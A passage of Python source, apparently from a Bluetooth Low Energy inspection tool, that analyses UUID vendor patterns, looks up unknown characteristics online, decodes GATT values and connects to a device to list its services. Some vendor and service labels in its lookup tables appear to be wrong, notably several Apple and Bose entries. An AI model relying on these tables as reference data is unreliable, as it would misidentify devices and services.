    """Analyze a list of UUIDs to identify vendor patterns.

    Args:
        uuids: List of 128-bit UUID strings

    Returns:
        Dictionary with pattern analysis
    """
    analysis = {
        "total_uuids": len(uuids),
        "uuid_versions": {},
        "base_patterns": {},
        "likely_vendor": None,
        "common_base": None
    }

    # Known vendor base patterns (last 96 bits / 24 hex chars)
    KNOWN_BASES = {
        "0000-1000-8000-00805f9b34fb": "Bluetooth SIG (Standard)",
        "ba5e-f4ee-5ca1-eb1e5e4b1ce0": "Nordic Semiconductor (Legacy)",
        "451a-8ffc-0000-10008000002a": "Qualcomm",
        "5ca1-eb1e-5e4b-1ce000000000": "Nordic Semiconductor",
        "7700-8000-b042-88a1cd000000": "Texas Instruments",
    }

    for uuid in uuids:
        uuid = uuid.lower()

        # Skip short-format UUIDs (e.g., "uuid-16:2a28") - only analyze 128-bit UUIDs
        if not uuid or len(uuid) < 36 or "uuid-16" in uuid:
            continue

        # Determine UUID version from version nibble (position 14-15)
        # Format: xxxxxxxx-xxxx-Vxxx-xxxx-xxxxxxxxxxxx where V is version
        try:
            if len(uuid) >= 15 and uuid[14].isalnum():
                version_char = uuid[14]
                version = int(version_char, 16)
                version_name = {
                    1: "v1 (Time-based)",
                    2: "v2 (DCE Security)",
                    3: "v3 (MD5 Hash)",
                    4: "v4 (Random)",
                    5: "v5 (SHA-1 Hash)"
                }.get(version, f"v{version}")
                analysis["uuid_versions"][version_name] = analysis["uuid_versions"].get(
                    version_name, 0) + 1
        except (ValueError, IndexError):
            pass  # Skip if version parsing fails

        # Extract base pattern (last 24 chars - excludes the unique identifier portion)
        if len(uuid) >= 24:
            base = uuid[-24:]
            if base not in analysis["base_patterns"]:
                analysis["base_patterns"][base] = []
            analysis["base_patterns"][base].append(uuid)

    # Find most common base
    if analysis["base_patterns"]:
        most_common_base = max(analysis["base_patterns"].keys(),
                               key=lambda k: len(analysis["base_patterns"][k]))
        analysis["common_base"] = most_common_base
        analysis["common_base_count"] = len(
            analysis["base_patterns"][most_common_base])

        # Check against known vendor bases
        for known_base, vendor in KNOWN_BASES.items():
            if known_base in most_common_base or most_common_base in known_base:
                analysis["likely_vendor"] = vendor
                break

    return analysis


async def research_unknown_characteristics(unknown_chars: list, mac_address: str) -> dict:
    """Perform automated research on unknown characteristics.

    Args:
        unknown_chars: List of tuples (uuid, properties, service_name)
        mac_address: Device MAC address for OUI lookup

    Returns:
        Dictionary with all research results
    """
    import urllib.parse

    research = {
        "oui_lookup": None,
        "pattern_analysis": None,
        "uuid_findings": {},
        "github_results": {},
        "nordic_results": {},
        "web_results": {},
        "known_specs": {}
    }

    # Lookup OUI vendor
    print(
        f"\n  \033[1;36m⟳ Looking up device manufacturer from MAC OUI...\033[0m")
    research["oui_lookup"] = await lookup_oui_vendor(mac_address)

    # Analyze UUID patterns
    print(f"  \033[1;36m⟳ Analyzing UUID patterns...\033[0m")
    uuids = [uuid for uuid, _, _ in unknown_chars]
    research["pattern_analysis"] = await analyze_uuid_patterns(uuids)

    # Search Nordic database for each UUID (rate limited)
    print(f"  \033[1;36m⟳ Searching Nordic Bluetooth Numbers Database...\033[0m")
    for uuid, props, svc in unknown_chars[:10]:  # Limit to first 10
        result = await search_nordic_database(uuid)
        if result:
            research["nordic_results"][uuid] = result

    # Search GitHub for first 3 unique base patterns (to avoid rate limits)
    print(f"  \033[1;36m⟳ Searching GitHub for UUID references...\033[0m")
    searched_bases = set()
    for uuid, props, svc in unknown_chars:
        if len(searched_bases) >= 3:
            break
        base = uuid[-24:] if len(uuid) >= 24 else uuid
        if base not in searched_bases:
            searched_bases.add(base)
            # Search for the full UUID
            results = await search_uuid_github(uuid)
            if results:
                research["github_results"][uuid] = results
            await asyncio.sleep(0.5)  # Rate limit

    # Search known BLE specifications and web for ALL UUIDs
    print(f"  \033[1;36m⟳ Searching known BLE specifications and web...\033[0m")
    search_count = 0
    for uuid, props, svc in unknown_chars:
        uuid_lower = uuid.lower()

        # Skip if already found in Nordic or GitHub
        if uuid in research["nordic_results"] or uuid in research["github_results"]:
            continue

        # Check known specifications first (instant, no network)
        if uuid_lower in KNOWN_BLE_SPECIFICATIONS:
            research["known_specs"][uuid] = KNOWN_BLE_SPECIFICATIONS[uuid_lower]
            continue

        # Limit web searches to avoid rate limits (first 10 unfound)
        if search_count < 10:
            result = await search_web_for_uuid(uuid)
            if result:
                if result.get("source") == "Known BLE Specifications":
                    research["known_specs"][uuid] = result
                else:
                    research["web_results"][uuid] = result
            search_count += 1
            await asyncio.sleep(0.3)  # Rate limit web searches

    return research


def print_research_results(research: dict, unknown_chars: list, term_width: int):
    """Print formatted research results.

    Args:
        research: Dictionary from research_unknown_characteristics()
        unknown_chars: Original list of unknown characteristics
        term_width: Terminal width for formatting
    """

    def print_header(title):
        print(f"\n\033[1;36m{'─' * term_width}\033[0m")
        print(f"\033[1;36m  {title}\033[0m")
        print(f"\033[1;36m{'─' * term_width}\033[0m")

    print_header("AUTOMATED RESEARCH RESULTS")

    # OUI Lookup Results
    oui = research.get("oui_lookup", {})
    print(f"\n  \033[1;33m📍 DEVICE MANUFACTURER (OUI Lookup)\033[0m")
    if oui.get("vendor"):
        print(f"     MAC OUI: \033[1;36m{oui.get('oui')}\033[0m")
        print(f"     Vendor: \033[1;32m{oui.get('vendor')}\033[0m")
        if oui.get("address"):
            print(f"     Address: {oui.get('address')}")
        print(f"     Source: {oui.get('source')}")
    else:
        print(f"     MAC OUI: \033[1;36m{oui.get('oui')}\033[0m")
        print(
            f"     \033[0;90mVendor not found in public databases (may be randomized MAC)\033[0m")

    # Pattern Analysis
    analysis = research.get("pattern_analysis", {})
    print(f"\n  \033[1;33m🔍 UUID PATTERN ANALYSIS\033[0m")

    if analysis.get("uuid_versions"):
        versions = ", ".join(
            f"{k}: {v}" for k, v in analysis["uuid_versions"].items())
        print(f"     UUID Versions: {versions}")

    base_patterns = analysis.get("base_patterns", {})
    print(f"     Unique Base Patterns: {len(base_patterns)}")

    if analysis.get("likely_vendor"):
        print(
            f"     \033[1;32mIdentified Vendor: {analysis['likely_vendor']}\033[0m")
    elif analysis.get("common_base"):
        print(f"     Common Base: {analysis['common_base']}")
        print(
            f"     Characteristics with this base: {analysis.get('common_base_count', 0)}")
        print(
            f"     \033[0;90m→ Search this pattern to identify the vendor SDK\033[0m")

    if len(base_patterns) == 1:
        print(
            f"     \033[1;32m✓ All UUIDs share the same base - likely from a single vendor SDK\033[0m")
    elif len(base_patterns) > 1:
        print(
            f"     \033[0;33m⚠ Multiple base patterns - device may use multiple vendor libraries\033[0m")

    # Nordic Database Results
    nordic = research.get("nordic_results", {})
    if nordic:
        print(f"\n  \033[1;33m📚 NORDIC DATABASE MATCHES\033[0m")
        for uuid, info in nordic.items():
            print(f"     \033[1;32m{info.get('name', 'Unknown')}\033[0m")
            print(f"       UUID: {uuid}")
            print(f"       ID: {info.get('identifier', 'N/A')}")

    # Known BLE Specifications Results
    known_specs = research.get("known_specs", {})
    if known_specs:
        print(f"\n  \033[1;33m📖 KNOWN BLE SPECIFICATIONS\033[0m")
        for uuid, info in known_specs.items():
            print(f"     \033[1;32m✓ {info.get('name', 'Unknown')}\033[0m")
            print(f"       UUID: \033[1;36m{uuid}\033[0m")
            if info.get('description'):
                print(f"       Description: {info['description']}")
            if info.get('spec'):
                print(f"       Specification: \033[0;33m{info['spec']}\033[0m")
            if info.get('section'):
                print(f"       Section: {info['section']}")
            if info.get('url'):
                print(f"       Reference: \033[0;36m{info['url']}\033[0m")

    # Web Search Results
    web_results = research.get("web_results", {})
    if web_results:
        print(f"\n  \033[1;33m🌐 WEB SEARCH RESULTS\033[0m")
        for uuid, info in web_results.items():
            if info.get("web_results"):
                print(f"     UUID: \033[1;36m{uuid}\033[0m")
                for i, result in enumerate(info["web_results"][:2], 1):
                    print(
                        f"       {i}. \033[1;32m{result.get('title', 'Unknown')}\033[0m")
                    if result.get('url'):
                        print(f"          \033[0;36m{result['url']}\033[0m")
                    if result.get('snippet'):
                        # Truncate long snippets
                        snippet = result['snippet'][:100]
                        if len(result['snippet']) > 100:
                            snippet += "..."
                        print(f"          \033[0;90m{snippet}\033[0m")

    # GitHub Results
    github = research.get("github_results", {})
    if github:
        print(f"\n  \033[1;33m🔗 GITHUB CODE REFERENCES\033[0m")
        for uuid, results in github.items():
            print(f"     UUID: {uuid[:8]}...{uuid[-4:]}")
            for r in results[:2]:
                print(f"       → \033[0;36m{r.get('repo')}\033[0m")
                print(f"         {r.get('path')}")
    else:
        print(f"\n  \033[1;33m🔗 GITHUB CODE REFERENCES\033[0m")
        print(
            f"     \033[0;90mNo public code references found (may need authenticated search)\033[0m")

    # Recommended next steps
    print(f"\n  \033[1;33m📋 RECOMMENDED NEXT STEPS\033[0m")

    vendor = oui.get("vendor") or analysis.get("likely_vendor")
    if vendor:
        print(
            f"     1. Search for \"{vendor} BLE SDK\" or \"{vendor} Bluetooth documentation\"")
        print(
            f"     2. Look for {vendor} developer portal or GitHub repositories")
    else:
        print(f"     1. Device may use a randomized MAC - check Device Information Service for vendor")

    # Count how many UUIDs were identified
    found_uuids = set()
    found_uuids.update(research.get("nordic_results", {}).keys())
    found_uuids.update(research.get("known_specs", {}).keys())
    found_uuids.update(research.get("web_results", {}).keys())
    found_uuids.update(research.get("github_results", {}).keys())

    total_unknown = len(unknown_chars)
    total_found = len(found_uuids)

    if total_found > 0:
        print(
            f"\n  \033[1;32m✓ Identified {total_found}/{total_unknown} unknown characteristics automatically\033[0m")

    # Show UUIDs that weren't found
    unfound = [uuid for uuid, _, _ in unknown_chars if uuid not in found_uuids]

    if unfound:
        print(
            f"\n     \033[0;90mNo results found for {len(unfound)} UUID(s) - search manually:\033[0m")
        for uuid in unfound[:10]:  # Limit display
            print(f"       \"{uuid}\"")
        if len(unfound) > 10:
            print(f"       ... and {len(unfound) - 10} more")

    # FCC lookup suggestion if we found a vendor
    if vendor:
        vendor_search = vendor.replace(" ", "+").replace(",", "")
        print(
            f"\n     \033[0;90mFCC Database (may have protocol details):\033[0m")
        print(f"       https://fccid.io/search?q={vendor_search}")


def format_characteristic_value(short_id: str, char_name: str, value: bytes, appearances: dict) -> str:
    """Format a characteristic value based on its type for human-readable display."""
    if not value:
        return "(empty)"

    # Try to decode based on known characteristic types
    try:
        # String characteristics
        string_chars = {"2a00", "2a24", "2a25", "2a26", "2a27", "2a28", "2a29",
                        "2b93", "2b97", "2bb3", "2bb4", "2bc2"}  # Names, titles, provider names
        if short_id and short_id.lower() in string_chars:
            decoded = value.decode('utf-8', errors='replace').strip('\x00')
            if decoded and decoded.isprintable():
                return f'"{decoded}"'

        # Appearance (2 bytes)
        if short_id and short_id.lower() == "2a01" and len(value) >= 2:
            appearance = struct.unpack('<H', value[:2])[0]
            appearance_name = appearances.get(appearance, f"Unknown")
            return f"{appearance_name} (0x{appearance:04X})"

        # Battery Level (1 byte, 0-100%)
        if short_id and short_id.lower() == "2a19" and len(value) >= 1:
            return f"{value[0]}%"

        # Media State (1 byte)
        if short_id and short_id.lower() == "2ba3" and len(value) >= 1:
            states = {0: "Inactive", 1: "Playing", 2: "Paused", 3: "Seeking"}
            return states.get(value[0], f"Unknown (0x{value[0]:02X})")

        # Bearer Technology (1 byte)
        if short_id and short_id.lower() == "2bb5" and len(value) >= 1:
            techs = {0: "3G", 1: "4G/LTE", 2: "LTE", 3: "WiFi",
                     4: "5G", 5: "GSM", 6: "CDMA", 7: "2G", 8: "WCDMA"}
            return techs.get(value[0], f"Unknown (0x{value[0]:02X})")

        # Playing Order (1 byte)
        if short_id and short_id.lower() == "2ba1" and len(value) >= 1:
            orders = {0x01: "Single Once", 0x02: "Single Repeat", 0x03: "In Order Once",
                      0x04: "In Order Repeat", 0x05: "Oldest Once", 0x06: "Oldest Repeat",
                      0x07: "Newest Once", 0x08: "Newest Repeat", 0x09: "Shuffle Once",
                      0x0A: "Shuffle Repeat"}
            return orders.get(value[0], f"Unknown (0x{value[0]:02X})")

        # Track Duration/Position (4 bytes, int32 in 0.01 second units)
        if short_id and short_id.lower() in {"2b98", "2b99"} and len(value) >= 4:
            centiseconds = struct.unpack('<i', value[:4])[0]
            if centiseconds < 0:
                return "Unknown/Not Playing"
            seconds = centiseconds // 100
            minutes = seconds // 60
            secs = seconds % 60
            return f"{minutes}:{secs:02d}"

        # Playback Speed (1 byte, signed, speed = 2^(value/64))
        if short_id and short_id.lower() == "2b9a" and len(value) >= 1:
            speed_exp = struct.unpack('b', value[:1])[0]
            speed = 2 ** (speed_exp / 64)
            return f"{speed:.2f}x"

        # TMAP Role (2 bytes, bitmask)
        if short_id and short_id.lower() == "2b51" and len(value) >= 2:
            role = struct.unpack('<H', value[:2])[0]
            roles = []
            if role & 0x0001:
                roles.append("Call Gateway")
            if role & 0x0002:
                roles.append("Call Terminal")
            if role & 0x0004:
                roles.append("Unicast Media Sender")
            if role & 0x0008:
                roles.append("Unicast Media Receiver")
            if role & 0x0010:
                roles.append("Broadcast Media Sender")
            if role & 0x0020:
                roles.append("Broadcast Media Receiver")
            return ", ".join(roles) if roles else f"0x{role:04X}"

        # Content Control ID (1 byte)
        if short_id and short_id.lower() == "2bba" and len(value) >= 1:
            return f"CCID: {value[0]}"

        # Call State (variable length)
        if short_id and short_id.lower() == "2bbd" and len(value) >= 3:
            call_states = {0: "Incoming", 1: "Dialing", 2: "Alerting", 3: "Active",
                           4: "Locally Held", 5: "Remotely Held", 6: "Locally/Remotely Held"}
            states_str = []
            i = 0
            while i + 2 < len(value):
                call_idx = value[i]
                state = value[i + 1]
                flags = value[i + 2]
                state_name = call_states.get(state, f"Unknown({state})")
                flag_str = []
                if flags & 0x01:
                    flag_str.append("Outgoing")
                if flags & 0x02:
                    flag_str.append("Withheld")
                if flags & 0x04:
                    flag_str.append("Provided by Network")
                states_str.append(
                    f"Call {call_idx}: {state_name}" + (f" [{', '.join(flag_str)}]" if flag_str else ""))
                i += 3
            return "; ".join(states_str) if states_str else "No active calls"

        # Status Flags (2 bytes)
        if short_id and short_id.lower() == "2bbb" and len(value) >= 2:
            flags = struct.unpack('<H', value[:2])[0]
            flag_names = []
            if flags & 0x0001:
                flag_names.append("Inband Ringtone")
            if flags & 0x0002:
                flag_names.append("Silent Mode")
            return ", ".join(flag_names) if flag_names else f"0x{flags:04X}"

        # URI Schemes Supported (variable)
        if short_id and short_id.lower() == "2bb6":
            decoded = value.decode('utf-8', errors='replace').strip('\x00')
            if decoded:
                return f'"{decoded}"'

        # Central Address Resolution (1 byte)
        if short_id and short_id.lower() == "2aa6" and len(value) >= 1:
            return "Supported" if value[0] else "Not Supported"

        # Server Supported Features (0x2B3A) - bitmask
        if short_id and short_id.lower() == "2b3a" and len(value) >= 1:
            features = []
            if value[0] & 0x01:
                features.append("EATT Supported")
            return ", ".join(features) if features else "No optional features (0x00)"

        # Client Supported Features (0x2B29) - bitmask
        if short_id and short_id.lower() == "2b29" and len(value) >= 1:
            features = []
            if value[0] & 0x01:
                features.append("Robust Caching")
            if value[0] & 0x02:
                features.append("EATT")
            if value[0] & 0x04:
                features.append("Multiple Handle Value Notifications")
            return ", ".join(features) if features else "No features enabled (0x00)"

        # Database Hash (16 bytes) - used to detect GATT database changes
        if short_id and short_id.lower() == "2b2a" and len(value) >= 16:
            return f"GATT DB Hash: {value.hex()}"

        # Service Changed (0x2A05) - indicates range of affected handles
        if short_id and short_id.lower() == "2a05" and len(value) >= 4:
            start_handle = struct.unpack('<H', value[0:2])[0]
            end_handle = struct.unpack('<H', value[2:4])[0]
            return f"Changed handles: 0x{start_handle:04X} - 0x{end_handle:04X}"

        # Try to decode as UTF-8 string if it looks like text
        try:
            decoded = value.decode('utf-8', errors='strict').strip('\x00')
            if decoded and all(c.isprintable() or c.isspace() for c in decoded):
                return f'"{decoded}"'
        except (UnicodeDecodeError, ValueError):
            pass

        # Show as hex with length
        if len(value) <= 16:
            return f"[{len(value)} bytes] {value.hex()}"
        else:
            return f"[{len(value)} bytes] {value[:16].hex()}..."

    except Exception as e:
        logging.debug(f"Error formatting value: {e}")
        return f"[{len(value)} bytes] {value.hex()[:32]}..."


async def command_ble_info(args: argparse.Namespace):
    """Enumerate BLE device information by connecting and reading GATT services.

    Connects to a BLE device and reads:
    - Device Name and Appearance (Generic Access Profile)
    - Manufacturer, Model, Serial, Firmware (Device Information Service)
    - All available GATT services and characteristics
    """
    import bumble.hci
    from bumble.device import Device, DeviceConfiguration, Peer
    from bumble.transport import open_transport_or_link
    from bumble.hci import Address
    from bumble.gatt import (
        GATT_GENERIC_ACCESS_SERVICE,
        GATT_DEVICE_NAME_CHARACTERISTIC,
        GATT_APPEARANCE_CHARACTERISTIC,
        GATT_DEVICE_INFORMATION_SERVICE,
        GATT_MANUFACTURER_NAME_STRING_CHARACTERISTIC,
        GATT_MODEL_NUMBER_STRING_CHARACTERISTIC,
        GATT_SERIAL_NUMBER_STRING_CHARACTERISTIC,
        GATT_FIRMWARE_REVISION_STRING_CHARACTERISTIC,
        GATT_HARDWARE_REVISION_STRING_CHARACTERISTIC,
        GATT_SOFTWARE_REVISION_STRING_CHARACTERISTIC,
    )
    import shutil
    import signal

    controller = args.controller or "usb:0"
    target_address = args.target_address
    timeout = getattr(args, 'timeout', 10.0)

    # Track if user requested cancellation
    cancelled = False

    def handle_sigint(signum, frame):
        nonlocal cancelled
        cancelled = True
        print("\n\n  \033[1;33m⚠ Interrupted by user (Ctrl+C)\033[0m")
        raise KeyboardInterrupt()

    # Install signal handler for clean Ctrl+C
    original_handler = signal.signal(signal.SIGINT, handle_sigint)

    if not target_address:
        logging.error(
            "Target address required. Use --target-address or run 'ble-scan' first.")
        signal.signal(signal.SIGINT, original_handler)
        return

    # Release Bluetooth controller
    release_bluetooth_controller(controller)

    # Well-known service UUIDs for device type identification
    SERVICE_TYPES = {
        "0000180f-0000-1000-8000-00805f9b34fb": ("Battery Service", "🔋"),
        "0000180a-0000-1000-8000-00805f9b34fb": ("Device Information", "ℹ️"),
        "00001800-0000-1000-8000-00805f9b34fb": ("Generic Access", "📱"),
        "00001801-0000-1000-8000-00805f9b34fb": ("Generic Attribute", "📋"),
        "0000180d-0000-1000-8000-00805f9b34fb": ("Heart Rate", "❤️"),
        "00001816-0000-1000-8000-00805f9b34fb": ("Cycling Speed/Cadence", "🚴"),
        "00001818-0000-1000-8000-00805f9b34fb": ("Cycling Power", "⚡"),
        "00001819-0000-1000-8000-00805f9b34fb": ("Location/Navigation", "📍"),
        "0000181a-0000-1000-8000-00805f9b34fb": ("Environmental Sensing", "🌡️"),
        "0000181c-0000-1000-8000-00805f9b34fb": ("User Data", "👤"),
        "0000181d-0000-1000-8000-00805f9b34fb": ("Weight Scale", "⚖️"),
        "0000181e-0000-1000-8000-00805f9b34fb": ("Bond Management", "🔗"),
        "00001802-0000-1000-8000-00805f9b34fb": ("Immediate Alert", "🚨"),
        "00001803-0000-1000-8000-00805f9b34fb": ("Link Loss", "📶"),
        "00001804-0000-1000-8000-00805f9b34fb": ("Tx Power", "📡"),
        "00001805-0000-1000-8000-00805f9b34fb": ("Current Time", "🕐"),
        "00001806-0000-1000-8000-00805f9b34fb": ("Reference Time", "⏱️"),
        "00001808-0000-1000-8000-00805f9b34fb": ("Glucose", "💉"),
        "00001809-0000-1000-8000-00805f9b34fb": ("Health Thermometer", "🌡️"),
        "0000110a-0000-1000-8000-00805f9b34fb": ("Audio Source", "🔊"),
        "0000110b-0000-1000-8000-00805f9b34fb": ("Audio Sink", "🎧"),
        "0000111e-0000-1000-8000-00805f9b34fb": ("Handsfree", "📞"),
        "0000111f-0000-1000-8000-00805f9b34fb": ("Handsfree AG", "📞"),
        "00001812-0000-1000-8000-00805f9b34fb": ("HID (Keyboard/Mouse)", "⌨️"),
        "0000fe07-0000-1000-8000-00805f9b34fb": ("Apple Notification", "🍎"),
        "89d3502b-0f36-433a-8ef4-c502ad55f8dc": ("Apple AirPods", "🎧"),
        "9fa480e0-4967-4542-9390-d343dc5d04ae": ("Apple Nearby", "📱"),
        "7905f431-b5ce-4e99-a40f-4b1e122d00d0": ("Apple Media", "🎵"),
        "d0611e78-bbb4-4591-a5f8-487910ae4366": ("Apple HomeKit", "🏠"),
    }

    # Well-known characteristic UUIDs with descriptions
    CHARACTERISTIC_NAMES = {
        # Generic Access (0x1800)
        "2a00": ("Device Name", "The user-friendly name of the device"),
        "2a01": ("Appearance", "Device appearance category (e.g., phone, watch)"),
        "2a02": ("Peripheral Privacy Flag", "Privacy settings for the device"),
        "2a03": ("Reconnection Address", "Address for reconnection"),
        "2a04": ("Peripheral Preferred Connection", "Preferred connection parameters"),
        "2aa6": ("Central Address Resolution", "Indicates if device supports address resolution"),
        # Generic Attribute (0x1801)
        "2a05": ("Service Changed", "Indicates GATT database has changed"),
        "2b29": ("Client Supported Features", "Features supported by GATT client"),
        "2b2a": ("Database Hash", "Hash of GATT database for caching"),
        "2b3a": ("Server Supported Features", "Features supported by GATT server"),
        # Device Information (0x180A)
        "2a23": ("System ID", "Unique system identifier"),
        "2a24": ("Model Number", "Device model number string"),
        "2a25": ("Serial Number", "Device serial number"),
        "2a26": ("Firmware Revision", "Firmware version string"),
        "2a27": ("Hardware Revision", "Hardware version string"),
        "2a28": ("Software Revision", "Software version string"),
        "2a29": ("Manufacturer Name", "Manufacturer name string"),
        "2a2a": ("IEEE Regulatory Cert", "Regulatory certification data"),
        "2a50": ("PnP ID", "Vendor/Product ID information"),
        # Battery Service (0x180F)
        "2a19": ("Battery Level", "Current battery percentage (0-100%)"),
        "2a1a": ("Battery Power State", "Charging/discharging state"),
        "2a1b": ("Battery Level State", "Battery level with state info"),
        # Generic Media Control Service (0x1849)
        "2b93": ("Media Player Name", "Name of the current media player app"),
        "2b94": ("Media Player Icon ObjID", "Icon object ID for media player"),
        "2b95": ("Media Player Icon URL", "URL to media player icon"),
        "2b96": ("Track Changed", "Notification when track changes"),
        "2b97": ("Track Title", "Title of current track"),
        "2b98": ("Track Duration", "Duration of current track in 0.01s"),
        "2b99": ("Track Position", "Current playback position in 0.01s"),
        "2b9a": ("Playback Speed", "Current playback speed multiplier"),
        "2b9b": ("Seeking Speed", "Speed when fast forwarding/rewinding"),
        "2b9c": ("Current Track Segments ObjID", "Track segments object ID"),
        "2b9d": ("Current Track ObjID", "Current track object ID"),
        "2b9e": ("Next Track ObjID", "Next track object ID"),
        "2b9f": ("Parent Group ObjID", "Parent group object ID"),
        "2ba0": ("Current Group ObjID", "Current group object ID"),
        "2ba1": ("Playing Order", "Order of playback (shuffle, repeat, etc)"),
        "2ba2": ("Playing Orders Supported", "Supported playback orders"),
        "2ba3": ("Media State", "Current state (playing, paused, stopped)"),
        "2ba4": ("Media Control Point", "Control commands (play, pause, etc)"),
        "2ba5": ("Media Control Opcodes Supported", "Supported control commands"),
        "2ba6": ("Search Results ObjID", "Search results object ID"),
        "2ba7": ("Search Control Point", "Search commands"),
        "2bba": ("Content Control ID", "Unique ID for content control"),
        # Generic Telephone Bearer Service (0x184C)
        "2bb3": ("Bearer Provider Name", "Name of phone carrier/provider"),
        "2bb4": ("Bearer UCI", "Uniform Caller Identifier"),
        "2bb5": ("Bearer Technology", "Network type (GSM, LTE, 5G, WiFi)"),
        "2bb6": ("Bearer URI Schemes", "Supported URI schemes (tel:, sip:)"),
        "2bb7": ("Bearer Signal Strength", "Signal strength value"),
        "2bb8": ("Bearer Signal Strength Reporting Interval", "How often to report signal"),
        "2bb9": ("Bearer List Current Calls", "List of active/held calls"),
        "2bbb": ("Status Flags", "Call status flags"),
        "2bbc": ("Incoming Call Target Bearer URI", "URI of incoming call destination"),
        "2bbd": ("Call State", "State of current call"),
        "2bbe": ("Call Control Point", "Call commands (answer, hangup, etc)"),
        "2bbf": ("Call Control Point Optional Opcodes", "Optional call commands supported"),
        "2bc0": ("Termination Reason", "Why call ended"),
        "2bc1": ("Incoming Call", "Info about incoming call"),
        "2bc2": ("Call Friendly Name", "Name of caller/callee"),
        # Telephony and Media Audio Service (0x1855) - TMAP
        "2b51": ("TMAP Role", "Telephony/Media Audio Profile role"),
        # Volume Control Service (0x1844)
        "2b7d": ("Volume State", "Current volume level and mute state"),
        "2b7e": ("Volume Control Point", "Volume commands"),
        "2b7f": ("Volume Flags", "Volume feature flags"),
        # Microphone Control Service (0x184D)
        "2bc3": ("Mute", "Microphone mute state"),
        # Audio Input Control Service (0x1843)
        "2b77": ("Audio Input State", "State of audio input"),
        "2b78": ("Gain Settings Attribute", "Gain settings"),
        "2b79": ("Audio Input Type", "Type of audio input"),
        "2b7a": ("Audio Input Status", "Status of audio input"),
        "2b7b": ("Audio Input Control Point", "Control audio input"),
        "2b7c": ("Audio Input Description", "Description of input"),
        # Heart Rate Service (0x180D)
        "2a37": ("Heart Rate Measurement", "Current heart rate in BPM"),
        "2a38": ("Body Sensor Location", "Where sensor is worn"),
        "2a39": ("Heart Rate Control Point", "Reset energy expended"),
        # HID Service (0x1812)
        "2a4a": ("HID Information", "HID version and country code"),
        "2a4b": ("Report Map", "HID report descriptor"),
        "2a4c": ("HID Control Point", "Suspend/exit suspend"),
        "2a4d": ("Report", "HID input/output report data"),
        "2a4e": ("Protocol Mode", "HID boot/report protocol mode"),
        # Environmental Sensing (0x181A)
        "2a6e": ("Temperature", "Temperature measurement"),
        "2a6f": ("Humidity", "Humidity percentage"),
        "2a76": ("UV Index", "UV radiation index"),
        "2a77": ("Irradiance", "Light irradiance value"),
        "2a78": ("Rainfall", "Rainfall measurement"),
        "2a79": ("Wind Speed", "Wind speed measurement"),
        "2aa1": ("Magnetic Flux Density 2D", "Compass data"),
        "2aa2": ("Magnetic Flux Density 3D", "3D compass data"),
        # Current Time Service (0x1805)
        "2a2b": ("Current Time", "Current date/time"),
        "2a0f": ("Local Time Information", "Timezone and DST info"),
        "2a14": ("Reference Time Information", "Time accuracy info"),
        # Location and Navigation (0x1819)
        "2a67": ("Location and Speed", "GPS location and speed"),
        "2a68": ("Navigation", "Navigation data"),
        "2a6a": ("LN Feature", "Location/Navigation features"),
        "2a6b": ("LN Control Point", "Location/Navigation control"),
        # Scan Parameters (0x1813)
        "2a4f": ("Scan Interval Window", "BLE scan parameters"),
        "2a31": ("Scan Refresh", "Scan refresh value"),
        # Alert Notification Service (0x1811)
        "2a44": ("Alert Notification Control Point", "Alert control"),
        "2a46": ("New Alert", "New alert notification"),
        "2a47": ("Supported New Alert Category", "Alert categories supported"),
        "2a48": ("Supported Unread Alert Category", "Unread categories supported"),
        "2a45": ("Unread Alert Status", "Unread alert count"),
        # Phone Alert Status (0x180E)
        "2a3f": ("Alert Status", "Phone alert status (silent, vibrate, etc)"),
        "2a40": ("Ringer Control Point", "Control phone ringer"),
        "2a41": ("Ringer Setting", "Current ringer setting"),
        # Immediate Alert (0x1802)
        "2a06": ("Alert Level", "Alert level (none, mild, high)"),
        # Tx Power (0x1804)
        "2a07": ("Tx Power Level", "Transmit power level in dBm"),
        # Link Loss (0x1803)
        # Uses 2a06 (Alert Level)
    }

    # Vendor-specific 128-bit characteristic UUIDs (common ones from various manufacturers)
    VENDOR_CHARACTERISTICS = {
        # Nordic Semiconductor UART Service
        "6e400002-b5a3-f393-e0a9-e50e24dcca9e": ("Nordic UART RX", "Nordic", "Receive data from phone to device"),
        "6e400003-b5a3-f393-e0a9-e50e24dcca9e": ("Nordic UART TX", "Nordic", "Transmit data from device to phone"),
        # Texas Instruments SensorTag
        "f000aa01-0451-4000-b000-000000000000": ("TI Temperature Data", "Texas Instruments", "IR temperature sensor reading"),
        "f000aa02-0451-4000-b000-000000000000": ("TI Temperature Config", "Texas Instruments", "Temperature sensor configuration"),
        "f000aa11-0451-4000-b000-000000000000": ("TI Accelerometer Data", "Texas Instruments", "Accelerometer XYZ values"),
        "f000aa21-0451-4000-b000-000000000000": ("TI Humidity Data", "Texas Instruments", "Humidity sensor reading"),
        "f000aa31-0451-4000-b000-000000000000": ("TI Magnetometer Data", "Texas Instruments", "Compass/magnetometer reading"),
        "f000aa41-0451-4000-b000-000000000000": ("TI Barometer Data", "Texas Instruments", "Barometric pressure reading"),
        "f000aa51-0451-4000-b000-000000000000": ("TI Gyroscope Data", "Texas Instruments", "Gyroscope XYZ values"),
        # Apple
        "9b3c81d8-57b1-4a8a-b8df-0e56f7ca51c2": ("Apple Continuity", "Apple", "Continuity/Handoff data"),
        "69d1d8f3-45e1-49a8-9821-9bbdfdaad9d9": ("Apple Notification Source", "Apple", "iOS notification data"),
        "9fbf120d-6301-42d9-8c58-25e699a21dbd": ("Apple Control Point", "Apple", "ANCS control point"),
        "22eac6e9-24d6-4bb5-be44-b36ace7c7bfb": ("Apple Data Source", "Apple", "ANCS data source"),
        # Bose
        "f0001131-0451-4000-b000-000000000000": ("Bose Audio Control", "Bose", "Audio control commands"),
        "f0001132-0451-4000-b000-000000000000": ("Bose Audio Status", "Bose", "Audio status information"),
        # Fitbit
        "558dfa00-4fa8-4105-9f02-4eaa93e62980": ("Fitbit Live Data", "Fitbit", "Real-time fitness data"),
        "558dfa01-4fa8-4105-9f02-4eaa93e62980": ("Fitbit Control", "Fitbit", "Device control commands"),
        # Xiaomi
        "0000ff01-0000-1000-8000-00805f9b34fb": ("Xiaomi Activity Data", "Xiaomi", "Steps/activity information"),
        "0000ff02-0000-1000-8000-00805f9b34fb": ("Xiaomi Control Point", "Xiaomi", "Device control"),
        "0000ff03-0000-1000-8000-00805f9b34fb": ("Xiaomi User Info", "Xiaomi", "User profile data"),
        # JBL/Harman
        "02e19538-b50e-11ea-b3de-0242ac130004": ("JBL Control", "JBL/Harman", "Speaker control commands"),
        "02e1952a-b50e-11ea-b3de-0242ac130004": ("JBL Status", "JBL/Harman", "Speaker status"),
        # Sonos
